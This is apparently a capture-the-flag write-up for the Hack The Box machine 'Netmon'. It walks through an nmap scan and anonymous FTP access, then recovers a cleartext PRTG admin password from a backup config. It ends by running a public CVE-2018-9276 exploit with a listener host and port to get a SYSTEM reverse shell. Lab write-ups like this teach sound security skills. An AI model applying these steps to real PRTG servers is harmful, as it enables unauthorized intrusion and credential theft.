# Netmon

## Recon
Started this box with my usual nmap command `nmap -sV -sC -Pn 10.10.10.152`

```
-sV: show service/version info
-sC: run default scripts
-Pn: treat host as online
```

After running this, we get the following output:
```
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

We can see that ftp is open, and allows anonymous login. So we log in as ftp and accesses Users to obtain the user flag. I attempted to log into Administrator but was not allowed access for the system own.


## Foothold/RCE

As I couldn't access the Administrator directory directly, I had a look at what other files and directories are on the machine. Inside Program Files (x86) I found PRTG Network Monitor. As I'm unfamilliar with this program, I googled it.

I found that this is a network monitor, the dashboard can also be accessed via 10.10.10.152:80 as listed in nmap. I then serached for known vulnerabilities anmd came across [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276) and an associated exploit in this link. Reading the link, I saw there were default credentials to try, so before doing any more recon, I tried those with `python3 exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.14.8 --lport 9999 --user prtgadmin --password prtgadmin`. No luck.

The page also prompts users to search for credentials on the machine. I followed the link on the page to [this page](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) to see where PRTG stores its data.

I went back to my ftp session, and navigated to C:\ProgramData\ which was available, but just hidden. From here I dove down to Paessler/PRTG Network Monitor. I was met with a LOT of files and wasn't sure what to investigate further to obtain credentials. After some more googling I found [this post](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) on reddit's sysadmin board which was prompting peole to delete any Configuration.dat files that may have leaked password in cleartext.

Going back to FTP, in this directory i saw the following files:
```
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
```

So I downloaded a copy of each through FTP and started to sift through them. PRTG Configuration.dat and PRTG Configuration.old did not hold any user credentials, however, when I searched for a password in PRTG Configuration.old.bak, I found:
```
<dbpassword>
         <!-- User: prtgadmin -->
         PrTg@dmin2018
            </dbpassword>
```

Bingo. Just what I was looking for. With creds in hand, I returned to 10.10.10.152:80 to login, however my password was not accepted. Looking back at the files I had found, I realised that the file I had obtained the password from was from 2018, whereas the rest were from 2019. I mad a slight adjustment, changing the password to `PrTg@dmin2019` and gained access to the dashboard. Now that I had a working username and password, I could launch the exploit I'd obtained from Github.

I booted the scripts back up again with `python3 exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.14.8 --lport 9999 --user prtgadmin --password PrTg@dmin2019` and was met with a shell shortly afterwards.

I was logged into C:\Windows\system32, but after navigating to C:\Users\Administrator\Desktop, I obtained the system flag as well.
